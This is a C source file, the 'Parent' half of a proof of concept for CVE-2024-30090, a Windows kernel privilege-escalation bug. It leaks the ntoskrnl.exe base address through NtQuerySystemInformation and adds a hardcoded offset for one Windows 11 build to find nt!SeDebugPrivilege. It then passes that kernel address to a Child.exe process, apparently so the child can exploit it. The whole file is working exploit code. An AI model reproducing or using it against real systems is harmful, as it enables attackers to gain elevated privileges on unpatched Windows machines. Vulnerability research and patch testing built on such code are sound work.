#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

#define MAXIMUM_FILENAME_LENGTH 255 
#define SystemModuleInformation 0xb

#define NtSeDebugPrivilege_RVA 0xD53A18 // ntoskrnl.exe Windows 11 23H2 build 10.0.22621.3672

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

//print error message, wait for enter and terminate
void __declspec(noreturn) error(const char* szErr)
{
	printf("[-] %s\n", szErr);

	getchar();
	exit(-1);
}

//acquire base address of ntoskrnl.exe module in kernel space
PCHAR GetKernelBase(void) {
	DWORD dwSize = 0;

	if (NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, dwSize, &dwSize) != STATUS_INFO_LENGTH_MISMATCH)
		error("Cannot get length of system module list array");

	PSYSTEM_MODULE_INFORMATION pSystemModules = (PSYSTEM_MODULE_INFORMATION)malloc(dwSize);

	if (!pSystemModules)
		error("Cannot allocate memory for system module list");

	if (!NT_SUCCESS(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pSystemModules, dwSize, &dwSize)))
		error("Cannot get system module list");

	DWORD dwCount = pSystemModules->ModulesCount;
	//printf("[+] Found %d system modules\n", dwCount);

	for (DWORD i = 0; i < dwCount; i++) {
		if (strstr((const char*)pSystemModules->Modules[i].Name, "ntoskrnl.exe")) {
			PCHAR pBase = (PCHAR)pSystemModules->Modules[i].ImageBaseAddress;
			printf("[+] Found kernel base at 0x%p\n", pBase);
			free(pSystemModules);
			return pBase;
		}
	}

	error("Cannot find ntoskrnl.exe in system module list");
}

int main(DWORD argc, CHAR* argv[]) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	wchar_t cmdLine[256] = { 0 };
	DWORD64 NtKernelBase = 0;
	DWORD64	NtSeDebugPrivilegeVA = 0;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	printf("CVE-2024-30090 PoC - Parent\n");

	NtKernelBase = (DWORD64) GetKernelBase();
	NtSeDebugPrivilegeVA = NtKernelBase + NtSeDebugPrivilege_RVA;
	printf("nt!SeDebugPrivilege VA @ 0x%llx\n", NtSeDebugPrivilegeVA);

	_snwprintf_s(cmdLine, sizeof(cmdLine) / sizeof(wchar_t), _TRUNCATE, L"Child.exe 0x%llx", NtSeDebugPrivilegeVA);
	
	if (!CreateProcessW(
		NULL,
		cmdLine,        
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi)
		) {
		printf("[ERROR] CreateProcess LastError 0x%x\n", GetLastError());
		exit(2);
	}

	// Wait until the process exits
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}